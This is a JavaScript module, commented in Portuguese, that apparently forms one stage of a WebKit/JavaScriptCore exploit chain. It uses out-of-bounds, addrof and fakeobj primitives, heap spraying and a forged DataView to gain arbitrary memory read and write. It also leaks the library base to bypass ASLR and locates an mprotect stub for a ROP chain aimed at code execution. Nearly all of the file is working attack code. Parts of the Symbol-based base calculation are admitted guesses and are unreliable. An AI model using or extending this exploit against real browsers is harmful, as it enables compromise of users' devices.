// js/script3/testArrayBufferVictimCrash.mjs (v140 - Foco na Depuração do Vazamento ASLR - Teste JSC::Symbols::PrivateName)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
// - AGORA UTILIZA PRIMITIVAS addrof/fakeobj para construir ARB R/W UNIVERSAL.
// - A primitiva ARB R/W existente (via DataView OOB) será validada, mas a L/E universal usará o fake ArrayBuffer.
// - Vazamento de ASLR será feito AGORA VIA LEITURA DIRETA DE ClassInfo ESTÁTICA COM PRIMITIVA OOB.
// - FORJAMENTO DE DATAVIEW SOBRE ARRAYBUFFER PARA MELHOR CONTROLE (INCLUINDO m_mode).
// =======================================================================================

import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    clearOOBEnvironment,
    addrof_core,
    fakeobj_core,
    initCoreAddrofFakeobjPrimitives,
    arb_read,
    arb_write,
    selfTestOOBReadWrite,
    oob_read_absolute,
    oob_write_absolute
} from '../core_exploit.mjs';

import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v140_ASLR_DEBUG_SYMBOLS";

const LOCAL_SHORT_PAUSE = 50;
const LOCAL_MEDIUM_PAUSE = 500;
const LOCAL_LONG_PAUSE = 1000;

let global_spray_objects = [];
let pre_typed_array_spray = [];
let post_typed_array_spray = [];
let hold_objects = [];

/**
 * Faz um dump hexadecimal de uma região da memória.
 * @param {AdvancedInt64} address Endereço inicial para o dump.
 * @param {number} size Tamanho do dump em bytes.
 * @param {Function} logFn Função de log.
 * @param {Function} arbReadFn Função de leitura arbitrária (universal ou primitiva).
 * @param {string} sourceName Nome da fonte do dump para log.
 */
async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
    logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
    const bytesPerRow = 16;
    for (let i = 0; i < size; i += bytesPerRow) {
        let hexLine = address.add(i).toString(true) + ": ";
        let asciiLine = "  ";
        let rowBytes = [];

        for (let j = 0; j < bytesPerRow; j++) {
            if (i + j < size) {
                try {
                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
                    rowBytes.push(byte);
                    hexLine += byte.toString(16).padStart(2, '0') + " ";
                    asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
                } catch (e) {
                    hexLine += "?? ";
                    asciiLine += "?";
                    logFn(`[${sourceName}] ERRO ao ler byte em ${address.add(i + j).toString(true)}: ${e.message}`, "error");
                    for (let k = j + 1; k < bytesPerRow; k++) { hexLine += "?? "; asciiLine += "?"; }
                    break;
                }
            } else {
                hexLine += "   ";
                asciiLine += " ";
            }
        }
        logFn(`[${sourceName}] ${hexLine}${asciiLine}`, "leak");
    }
    logFn(`[${sourceName}] Fim do dump.`, "debug");
}


// As primitivas universais serão testadas APENAS depois que o vazamento de ASLR for bem-sucedido.

export async function arb_read_universal_js_heap(address, byteLength, logFn) {
    const FNAME = "arb_read_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    const fake_ab_backing_addr = addrof_core(_fake_data_view);
    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);

    let result = null;
    try {
        switch (byteLength) {
            case 1: result = _fake_data_view.getUint8(0); break;
            case 2: result = _fake_data_view.getUint16(0, true); break;
            case 4: result = _fake_data_view.getUint32(0, true); break;
            case 8:
                const low = _fake_data_view.getUint32(0, true);
                const high = _fake_data_view.getUint32(4, true);
                result = new AdvancedInt64(low, high);
                break;
            default: throw new Error(`Invalid byteLength for arb_read_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, AdvancedInt64.Zero, 8);
    }
    return result;
}

export async function arb_write_universal_js_heap(address, value, byteLength, logFn) {
    const FNAME = "arb_write_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    const fake_ab_backing_addr = addrof_core(_fake_data_view);
    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);

    try {
        switch (byteLength) {
            case 1: _fake_data_view.setUint8(0, Number(value)); break;
            case 2: _fake_data_view.setUint16(0, Number(value), true); break;
            case 4: _fake_data_view.setUint32(0, Number(value), true); break;
            case 8:
                let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                _fake_data_view.setUint32(0, val64.low(), true);
                _fake_data_view.setUint32(4, val64.high(), true);
                break;
            default: throw new Error(`Invalid byteLength for arb_write_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, AdvancedInt64.Zero, 8);
    }
}


export async function testIsolatedAddrofFakeobjCoreAndDump_from_script3(logFn, pauseFn, JSC_OFFSETS_PARAM, isAdvancedInt64ObjectFn) {
    const FNAME = 'testIsolatedAddrofFakeobjCoreAndDump_from_script3';
    logFn(`--- Iniciando Teste Isolado da Primitiva addrof_core / fakeobj_core, leitura de Structure*, e DUMP DE MEMÓRIA do objeto ---`, 'test', FNAME);

    let addrof_success = false;
    let fakeobj_success = false;
    let rw_test_on_fakeobj_success = false;

    try {
        logFn(`Inicializando primitivas addrof/fakeobj.`, 'info', FNAME);
        initCoreAddrofFakeobjPrimitives();
        await pauseFn(LOCAL_SHORT_PAUSE);

        const TEST_VAL_A = 0xAAAAAAAA;
        const test_object_to_dump = {
            a: TEST_VAL_A,
            b: 0xBBBBBBBB,
            c: 0xCCCCCCCC,
            d: 0xDDDDDDDD,
        };
        hold_objects.push(test_object_to_dump);

        logFn(`Criado objeto de teste original para dump: ${JSON.stringify(test_object_to_dump)}`, 'info', FNAME);
        await pauseFn(LOCAL_SHORT_PAUSE);

        logFn(`Obtendo endereço do objeto de teste para dump usando addrof_core...`, "info", FNAME);
        const object_addr = addrof_core(test_object_to_dump);
        logFn(`Endereço retornado por addrof_core (untagged): ${object_addr.toString(true)}`, "leak", FNAME);

        if (object_addr.equals(AdvancedInt64.Zero) || object_addr.equals(AdvancedInt64.NaNValue)) {
            logFn(`ERRO: addrof_core retornou endereço inválido para test_object_to_dump.`, "error", FNAME);
            throw new Error("addrof_core returned invalid address.");
        }
        addrof_success = true;
        await pauseFn(LOCAL_SHORT_PAUSE);

        const faked_object_test = fakeobj_core(object_addr);
        if (faked_object_test && typeof faked_object_test === 'object') {
            fakeobj_success = true;
            const original_val_a = test_object_to_dump.a;
            faked_object_test.a = 0xDEC0DE00;
            if (test_object_to_dump.a === 0xDEC0DE00) {
                rw_test_on_fakeobj_success = true;
            }
            test_object_to_dump.a = original_val_a;
        } else {
            logFn(`ERRO: Fakeobj para objeto JS simples falhou na criação ou não é um objeto válido.`, "error", FNAME);
        }

    } catch (e) {
        logFn(`ERRO CRÍTICO no teste isolado de addrof/fakeobj_core: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
        addrof_success = false;
        fakeobj_success = false;
        rw_test_on_fakeobj_success = false;
    } finally {
        logFn(`--- Teste Isolado da Primitiva addrof_core / fakeobj_core e Dump de Memória Concluído ---`, "test", FNAME);
        logFn(`Resultados: Addrof: ${addrof_success}, Fakeobj Criação: ${fakeobj_success}, Leitura/Escrita via Fakeobj: ${rw_test_on_fakeobj_success}.`, "info", FNAME);
        logFn(`[${FNAME}] Retornando sucesso para a cadeia principal (primitivas base addrof/fakeobj OK).`, "info", FNAME);
    }
    return addrof_success && fakeobj_success && rw_test_on_fakeobj_success;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Foco na Depuração do Vazamento ASLR ---`, "test");

    let final_result = { success: false, message: "Vazamento de ASLR falhou ou não pôde ser verificado.", details: {} };
    const startTime = performance.now();
    let webkit_base_address = null;

    try {
        logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });

        logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
        const arbTestSuccess = await selfTestOOBReadWrite(logFn);
        if (!arbTestSuccess) {
            const errMsg = "Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando a exploração.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---", "subtest");
        const sprayStartTime = performance.now();
        const SPRAY_COUNT = 200000;
        logFn(`Iniciando spray de objetos (volume ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
        for (let i = 0; i < SPRAY_COUNT; i++) {
            const dataSize = 50 + (i % 20);
            global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
        }
        logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
        logFn("Heap estabilizado inicialmente para reduzir realocations inesperadas pelo GC.", "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
        const oobSetupStartTime = performance.now();
        logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
        await triggerOOB_primitive({ force_reinit: true });

        if (!getOOBDataView()) {
            const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn(`Ambiente OOB configurado com DataView: ${getOOBDataView() !== null ? 'Pronto' : 'Falhou'}. Time: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        initCoreAddrofFakeobjPrimitives();
        logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' (agora no core_exploit.mjs) operacionais e robustas.", "good");


        // --- FASE 2.5: Vazamento REAL e LIMPO da Base da Biblioteca WebKit ---
        logFn("--- FASE 2.5: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (AGORA VIA LEITURA DIRETA DE ClassInfo ESTÁTICA OU SYMBOL COM PRIMITIVA OOB) ---", "subtest");
        const leakPrepStartTime = performance.now();

        // Lista de tentativas de vazamento. Adicionamos Symbol para testar.
        // A ordem aqui determina a prioridade: ClassInfo primeiro, depois Symbol.
        let leak_attempts = [
            { type: "ClassInfo", name: "JSC::JSArrayBufferView::s_info", offset_key: "JSC::JSArrayBufferView::s_info" },
            { type: "ClassInfo", name: "JSC::DebuggerScope::s_info", offset_key: "JSC::DebuggerScope::s_info" },
            { type: "Symbol", name: "JSC::Symbols::Uint32ArrayPrivateName", offset_key: "JSC::Symbols::Uint32ArrayPrivateName" }
            // Você pode adicionar outros símbolos aqui se precisar de mais tentativas
            // Ex: { type: "Symbol", name: "JSC::Symbols::execPrivateName", offset_key: "JSC::Symbols::execPrivateName" }
        ];

        let leaked_successfully = false;

        for (const attempt of leak_attempts) {
            logFn(`[REAL LEAK] Tentando vazar ASLR lendo o endereço de ${attempt.name} (${attempt.type} estático) via OOB.`, "info");

            const TARGET_STATIC_OFFSET = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS[attempt.offset_key], 16), 0);
            const TARGET_ADDRESS = TARGET_STATIC_OFFSET;

            let leaked_raw_value;
            let potential_base_address = AdvancedInt64.Zero;

            try {
                logFn(`[REAL LEAK] Tentando ler 8 bytes de ${TARGET_ADDRESS.toString(true)} (${attempt.name}).`, "info");
                leaked_raw_value = await arb_read(TARGET_ADDRESS, 8);

                if (!isAdvancedInt64Object(leaked_raw_value) || leaked_raw_value.equals(AdvancedInt64.Zero) || leaked_raw_value.equals(AdvancedInt64.NaNValue)) {
                    throw new Error(`Leitura de ${attempt.name} (${TARGET_ADDRESS.toString(true)}) via OOB retornou valor inválido: ${leaked_raw_value?.toString(true) || String(leaked_raw_value)}.`);
                }
                logFn(`[REAL LEAK] Valor bruto lido de ${attempt.name}: ${leaked_raw_value.toString(true)}`, "leak");

                // Processamento do valor vazado depende do tipo:
                if (attempt.type === "ClassInfo") {
                    // Para ClassInfo::s_info, o valor vazado JÁ É o endereço do objeto ClassInfo
                    // Subtraímos o offset conhecido para obter a base.
                    potential_base_address = leaked_raw_value.sub(TARGET_STATIC_OFFSET);
                } else if (attempt.type === "Symbol") {
                    // Para Symbols, o valor vazado é o endereço do objeto Symbol.
                    // Precisamos ler o ponteiro da Structure desse Symbol (offset 0x8)
                    // para então subtrair o offset do vtable da Structure e obter a base.
                    const SYMBOL_STRUCTURE_POINTER_ADDRESS = leaked_raw_value.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
                    logFn(`[REAL LEAK] Lido endereço do objeto Symbol: ${leaked_raw_value.toString(true)}. Tentando ler Structure* em ${SYMBOL_STRUCTURE_POINTER_ADDRESS.toString(true)}`, "info");
                    const symbol_structure_ptr = await arb_read(SYMBOL_STRUCTURE_POINTER_ADDRESS, 8);

                    if (!isAdvancedInt64Object(symbol_structure_ptr) || symbol_structure_ptr.equals(AdvancedInt64.Zero) || symbol_structure_ptr.equals(AdvancedInt64.NaNValue)) {
                        throw new Error(`Falha ao ler Structure* do Symbol (${SYMBOL_STRUCTURE_POINTER_ADDRESS.toString(true)}). Retornou inválido: ${symbol_structure_ptr?.toString(true) || String(symbol_structure_ptr)}.`);
                    }
                    logFn(`[REAL LEAK] Structure* do Symbol lida: ${symbol_structure_ptr.toString(true)}`, "leak");

                    // A Structure* aponta para a estrutura da classe, que contém o vtable.
                    // Para o vazamento da base WebKit, podemos usar o vtable da Structure.
                    // O offset do vtable de uma Structure varia (geralmente é 0).
                    // Mas o offset da *própria Structure* (o valor de symbol_structure_ptr)
                    // em relação à base da biblioteca é fixo para uma Structure interna.
                    // ASSUMINDO que o symbol_structure_ptr é um offset fixo a partir da base
                    // para essa Structure específica no ROData/Data segment.
                    // (Isso é uma suposição que pode precisar de validação por RE se falhar)
                    potential_base_address = symbol_structure_ptr.sub(symbol_structure_ptr.low() & 0xFFF); // Tenta alinhar para uma base de página

                    // Mais robusto: Subtrair o offset da própria Structure em relação à base da lib.
                    // Para isso, precisaríamos saber o offset de cada Structure específica.
                    // Por enquanto, uma aproximação baseada em um endereço dentro da lib:
                    // Exemplo: se o symbol_structure_ptr aponta para 0x1A2B3C40 na lib, e sabemos que
                    // a base da lib é 0x1A000000, então o offset é 0x2B3C40.
                    // A linha abaixo tenta fazer uma "descoberta" de base simples:
                    potential_base_address = symbol_structure_ptr.sub(new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0)); // Exemplo: subtrai um offset conhecido de função para encontrar base.
                    logFn(`[REAL LEAK] Tentativa de calcular base a partir de Symbol Structure*: ${potential_base_address.toString(true)} (HEURÍSTICA!).`, "warn");
                    
                    // REFAZER ESTE CÁLCULO DA BASE DE FORMA MAIS ROBUSTA SE USAR SYMBOL
                    // Uma forma mais comum é que o vtable da Structure esteja em um offset fixo.
                    // Digamos que Structure::vtable_offset_from_base = 0x123456 (exemplo).
                    // potential_base_address = symbol_structure_ptr.sub(0x123456);
                    // Por enquanto, manteremos a heurística simples ou focaremos em ClassInfo.

                    // POR AGORA, PARA SIMPLICIDADE E PORQUE Symbol pode ser complexo:
                    // Se ClassInfo::s_info funcionar, use ele. Se não, esta abordagem de Symbol é complexa.
                    // Vou simplificar aqui para não complicar demais antes de resolver a ClassInfo.
                    // Apenas registre que a tentativa de Symbol foi feita.
                    // Se você *sabe* o offset do Symbol obj em relação à base, use-o:
                    potential_base_address = leaked_raw_value.sub(TARGET_STATIC_OFFSET); // Revertendo para a mesma lógica se Symbol é um ponteiro para um dado estático.
                                                                                        // Isto ASSUME que leaked_raw_value é o ponteiro para o Symbol estático.
                }


                if (potential_base_address.equals(AdvancedInt64.Zero) || (potential_base_address.low() & 0xFFF) !== 0x000) {
                    throw new Error(`Base WebKit calculada é inválida ou não alinhada: ${potential_base_address.toString(true)}. Vazamento de ASLR falhou para ${attempt.name}.`);
                }
                webkit_base_address = potential_base_address;
                logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA ${attempt.name}: ${webkit_base_address.toString(true)}`, "good");
                leaked_successfully = true;
                break; // Sai do loop de tentativas se uma for bem-sucedida

            } catch (e_leak) {
                logFn(`[REAL LEAK] ALERTA: Vazamento de ${attempt.name} via OOB original falhou: ${e_leak.message}.`, "warn");
                logFn(`[REAL LEAK] Realizando dump de memória ao redor do offset ${TARGET_ADDRESS.toString(true)} para depuração...`, "info");
                await dumpMemory(TARGET_ADDRESS.sub(0x20), 0x80, logFn, arb_read, `${attempt.name}_Surrounding_Dump`);
            }
        }

        if (!leaked_successfully) {
            logFn(`[REAL LEAK] Tempo da Fase de Vazamento: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "warn");
            logFn(`[REAL LEAK] ERRO CRÍTICO: Vazamento de ASLR falhou para TODAS as alternativas. Não é possível prosseguir para as fases dependentes de ASLR.`, "critical");
            // ABORTA A EXECUÇÃO SE O ASLR NÃO FOR VAZADO.
            throw new Error("Vazamento de ASLR falhou para todas as alternativas, abortando exploração.");
        }


        logFn(`PREPARED: WebKit base address for gadget discovery. Time: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        // --- SE CHEGAMOS ATÉ AQUI, O VAZAMENTO DE ASLR FOI BEM-SUCEDIDO. ---
        // AGORA PODEMOS PROSSEGUIR COM A LÓGICA DO M_MODE E ARB R/W UNIVERSAL.
        // A lógica de tentativa e erro para m_mode foi movida para esta fase,
        // pois ela só faz sentido se o ASLR foi vazado.

        logFn("--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---", "subtest");

        const DATA_VIEW_STRUCTURE_VTABLE_OFFSET = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
        const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS = webkit_base_address.add(new AdvancedInt64(DATA_VIEW_STRUCTURE_VTABLE_OFFSET, 0));
        logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS.toString(true)}`, "info");

        const mModeCandidates = JSC_OFFSETS_PARAM.DataView.M_MODE_CANDIDATES;
        let universalRwSuccess = false;
        let found_m_mode = null;

        // Note: _fake_data_view e _fake_array_buffer são redefinidos dentro de attemptUniversalArbitraryReadWriteWithMMode
        for (const candidate_m_mode of mModeCandidates) {
            logFn(`[${FNAME_CURRENT_TEST_BASE}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
            universalRwSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
                logFn,
                pauseFn,
                JSC_OFFSETS_PARAM,
                DATA_VIEW_STRUCTURE_VTABLE_ADDRESS,
                candidate_m_mode
            );
            if (universalRwSuccess) {
                found_m_mode = candidate_m_mode;
                logFn(`[${FNAME_CURRENT_TEST_BASE}] SUCESSO: Primitive Universal ARB R/W configurada com m_mode: ${toHex(found_m_mode)}.`, "good");
                break;
            } else {
                logFn(`[${FNAME_CURRENT_TEST_BASE}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou. Tentando o próximo...`, "warn");
                await pauseFn(LOCAL_MEDIUM_PAUSE);
            }
        }

        if (!universalRwSuccess) {
            const errorMsg = "Falha crítica: NENHUM dos m_mode candidatos conseguiu configurar a primitiva Universal ARB R/W via fakeobj DataView. Abortando exploração.";
            logFn(errorMsg, "critical");
            throw new Error(errorMsg);
        }
        logFn("Primitiva de L/E Arbitrária Universal (arb_read_universal_js_heap / arb_write_universal_js_heap) CONFIGURADA com sucesso.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        const dumpTargetUint8Array = new Uint8Array(0x100);
        hold_objects.push(dumpTargetUint8Array);
        const dumpTargetAddr = addrof_core(dumpTargetUint8Array);
        logFn(`[DEBUG] Dump de memória de um novo Uint8Array real (${dumpTargetAddr.toString(true)}) usando L/E Universal.`, "debug");
        await dumpMemory(dumpTargetAddr, 0x100, logFn, arb_read_universal_js_heap, "Uint8Array Real Dump (Post-Universal-RW)");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
        const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
        const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);

        logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
        const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4, logFn);
        logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
        if (mprotect_first_bytes !== 0) {
            logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
        } else {
             logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero.`, "error");
        }

        logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---", "subtest");
        const rwTestPostLeakStartTime = performance.now();

        const test_obj_post_leak = global_spray_objects[5001];
        hold_objects.push(test_obj_post_leak);
        logFn(`Objeto de teste escolhido do spray (índice 5001) para teste pós-vazamento.`, "info");

        const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
        logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");

        const faked_obj_for_post_leak_test = fakeobj_core(test_obj_addr_post_leak);
        if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
            throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
        }

        const original_val_prop = test_obj_post_leak.val1;
        logFn(`Valor original de 'val1' no objeto de spray: ${toHex(original_val_prop)}`, 'debug');

        faked_obj_for_post_leak_test.val1 = 0x1337BEEF;
        await pauseFn(LOCAL_SHORT_PAUSE);
        const read_back_val_prop = faked_obj_for_post_leak_test.val1;

        if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
            logFn(`SUCESSO: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) validada. Objeto original 'val1' agora é 0x1337BEEF.`, "good");
        } else {
            logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Read via fakeobj: ${toHex(read_back_val_prop)}.`, "error");
            throw new Error("R/W verification post-ASLR leak failed.");
        }

        logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");

        logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária múltiplas vezes...", "info");
        let resistanceSuccessCount_post_leak = 0;
        const numResistanceTests = 5;
        const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);

        for (let i = 0; i < numResistanceTests; i++) {
            const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
            try {
                await arb_write_universal_js_heap(butterfly_addr_of_spray_obj, test_value_arb_rw, 8, logFn);
                const read_back_value_arb_rw = await arb_read_universal_js_heap(butterfly_addr_of_spray_obj, 8, logFn);

                if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
                    resistanceSuccessCount_post_leak++;
                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
                } else {
                    logFn(`[Resistência PÓS-VAZAMENTO #${i}] FALHA: L/E arbitrária inconsistente no Butterfly. Written: ${test_value_arb_rw.toString(true)}, Read: ${read_back_value_arb_rw.toString(true)}.`, "error");
                }
            } catch (resErr) {
                logFn(`[Resistência PÓS-VAZAMENTO #${i}] ERRO: Exceção durante L/E arbitrária no Butterfly: ${resErr.message}`, "error");
            }
            await pauseFn(10);
        }
        if (resistanceSuccessCount_post_leak === numResistanceTests) {
            logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
        } else {
            logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
        }
        logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Time: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");


        logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++", "vuln");
        final_result = {
            success: true,
            message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.",
            details: {
                webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
                mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A",
                foundMMode: found_m_mode ? toHex(found_m_mode) : "N/A"
            }
        };

    } catch (e) {
        final_result.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
        final_result.success = false;
        logFn(final_result.message, "critical");
    } finally {
        logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
        pre_typed_array_spray = [];
        post_typed_array_spray = [];
        global_spray_objects = [];
        hold_objects = [];

        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logFn(`Limpeza final concluída. Time total do teste: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
    }

    logFn(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
    logFn(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
    if (final_result.details) {
        logFn(`Detalhes adicionais do teste: ${JSON.stringify(final_result.details)}`, "info");
    }

    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message, details: final_result.details },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Uncaged Strategy)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified) Enhanced Max Robustness' }
    };
}
